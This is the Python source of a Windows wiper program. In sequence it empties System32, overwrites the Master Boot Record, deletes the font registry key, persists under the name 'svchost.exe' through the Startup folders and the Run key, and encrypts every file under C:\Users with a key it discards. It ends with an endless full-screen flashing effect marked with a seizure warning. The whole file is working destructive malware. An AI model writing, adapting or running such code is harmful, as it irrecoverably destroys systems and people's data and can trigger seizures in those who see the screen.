import ctypes
import subprocess
import tempfile
import sys
import os
import base64
import winreg
import shutil
from win32file import *
import win32gui
from cryptography.fernet import Fernet

#FURTHER CONSIDERATION
#https://github.com/SomeoneAlt-86/pc-killer/blob/main/pcKill.bat

#GDI effects (seizure warning)
def epilepsy():
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    while True:
        win32gui.InvertRect(hdc, (0, 0, w ,h))

#Uses robocopy to bypass permission issues when attempting to delete system32.
def corrupt():
    with tempfile.TemporaryDirectory() as empty:
        subprocess.Popen(
            ['robocopy', '/R:0', '/W:0', '/mir', empty, 'C:\\Windows\\System32'],
            creationflags=0x08000000,
            stdout=subprocess.PIPE,  # Redirect standard output and error
            stderr=subprocess.PIPE
        ).communicate()

#Sets wallpaper using image data in base64 format
# def set_wallpaper(base64_data):
#     temp_file_path = os.path.join(tempfile.gettempdir(), "wallpaper.jpg")
#     with open(temp_file_path, "wb") as temp_file:
#         temp_file.write(base64.b64decode(base64_data))
#     ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_file_path, 3)

#Sets wallpaper using the image bundled into the executable
def set_wallpaper():
    image_path = os.path.join(getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__))), 'lucifer.jpg')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

#Deletes fonts in registry: makes everything look like wingdings upon restart
def del_reg():
    registry_path = r"Software\Microsoft\Windows NT\CurrentVersion\Fonts"
    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path, 0, winreg.KEY_SET_VALUE):
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, registry_path)

#Persistency: puts executable in startup folder and under the CurrentVersion\Run key for auto-startup
def persist():
    program_name = "svchost.exe"
    path1 = os.path.join(os.environ['ProgramData'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', program_name)
    path2 = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Windows', 'Explorer', program_name)
    shutil.copy(sys.argv[0], path1)
    shutil.copy(sys.argv[0], path2)

    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, path2)
    winreg.CloseKey(key)

#Overrides the Master Boot Record lol GG
def mbr():
    data = (
    b'\xBB\x00\xA0\x8E\xC3\xDB\xE3\xB8\x13\x00\xCD\x10\x31\xFF\x8E\xDF'
    b'\xD9\x06\x7B\x7C\xBD\xC8\x00\xD9\x06\x7B\x7C\xBA\x40\x01\xD9\xEE'
    b'\xD9\xEE\xB0\x64\xD9\xC0\xDC\xC8\xD9\xC2\xDC\xC8\xDE\xE9\xD8\xC3'
    b'\xD9\xC1\xD9\xC3\xDE\xC9\xDC\xC0\xD8\xC5\xDD\xDB\xDD\xD9\xD9\xC0'
    b'\xDC\xC8\xD9\xC2\xDC\xC8\xDE\xC1\xDF\x1E\x87\x7C\x83\x3E\x87\x7C'
    b'\x04\x7D\x04\xFE\xC8\x75\xCD\xDD\xD8\xDD\xD8\x01\xF0\xAA\xD8\x06'
    b'\x73\x7C\x4A\x75\xB9\xDD\xD8\xD8\x06\x77\x7C\x4D\x75\xA9\x46\xDD'
    b'\xD8\xEB\x99\x9A\x99\x19\x3C\x8F\xC2\x75\x3C\x00\x00\xC0\xBF'+
    b'\x00' * 383 + b'\x55\xAA'
    )

    for _ in range(2):
        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
        WriteFile(hDevice, data, None)
        CloseHandle(hDevice)

#Encrypts everything in the Users directory with a randomly generated AES256 key
def encrypt():
    key = Fernet.generate_key()
    for root, _, filenames in os.walk("C:\\Users"):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            if file_path != os.path.abspath(sys.argv[0]):  # Exclude the script file itself
                try:
                    with open(file_path, "rb") as file:
                        contents = file.read()
                    cipher_suite = Fernet(key)
                    contents_encrypted = cipher_suite.encrypt(contents)
                    with open(file_path, "wb") as file:
                        file.write(contents_encrypted)
                except Exception as e:
                    pass


def main():
    corrupt()
    mbr()
    del_reg()
    persist()
    set_wallpaper()
    encrypt()
    epilepsy()

if __name__ == "__main__":
    main()